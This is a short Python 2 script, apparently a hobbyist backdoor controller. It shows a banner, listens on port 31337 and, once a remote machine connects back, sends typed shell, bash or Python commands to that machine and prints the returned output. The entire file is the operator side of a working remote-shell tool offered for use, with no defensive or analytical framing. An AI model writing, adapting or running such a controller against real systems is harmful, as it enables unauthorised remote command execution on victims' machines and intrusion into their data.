#!/usr/bin/python
import socket, os, sys, platform

if 'Windows' in platform.system():
	os.system('cls')
	print "                     |     |   | ,---` ,---` |   | ----- ,---`"
	print "                   \ * /   |   | |   | |     |   |   |   |   |"
	print "                   -*+*-   |   | |---, |     |---|   |   |   |"
	print "                   / * \   |   | |  \  |     |   |   |   |   |"
	print "                     |     `___, |   \ `___, |   | ----- |   |"
	print ""
	print "                         Made by Keegan Kuhn (keeganjk)"
	print "                                 Version: 1.0"
else:
	os.system("clear")
	print "                     |     |   | ,---` ,---` |   | ----- ,---`"
	print "                   \ * /   |   | |   | |     |   |   |   |   |"
	print "                   -*+*-   |   | |---, |     |---|   |   |   |"
	print "                   / * \   |   | |  \  |     |   |   |   |   |"
	print "                     |     `___, |   \ `___, |   | ----- |   |"
	print ""
	print "                         Made by Keegan Kuhn (" + "\033[1;31m" + "keeganjk" + "\033[0;0m" + ")"
	print "                                 Version: 1.0"


port = 31337
s = socket.socket()
s.bind(('', port))
print ""
print "                           Waiting for connection ..."
s.listen(1)
while True:
	c, addr = s.accept()
	print "                 Accepted connection from", addr, "!"
        print ""
	while True:
		cmd = raw_input("$ ")
		if cmd == "python":
			while cmd != "exit()":
				cmd = raw_input(">>> ")
				if cmd == "exit":
					print "Use exit() to exit"
				cmd = "python -c '" + cmd + "'"
				c.send(cmd)
				print c.recv(1024)
				
		elif cmd == "bash":
			while True:
				cmd = raw_input("bash$ ")
				cmd = "bash -c '" + cmd + "'"
				c.send(cmd)
				print c.recv(1024)
		
		elif cmd == "quit" or cmd == "exit":
			c.send('quit')
			s.close()
		        sys.exit(1)
		else:
		        c.send(cmd)
			print c.recv(1024)
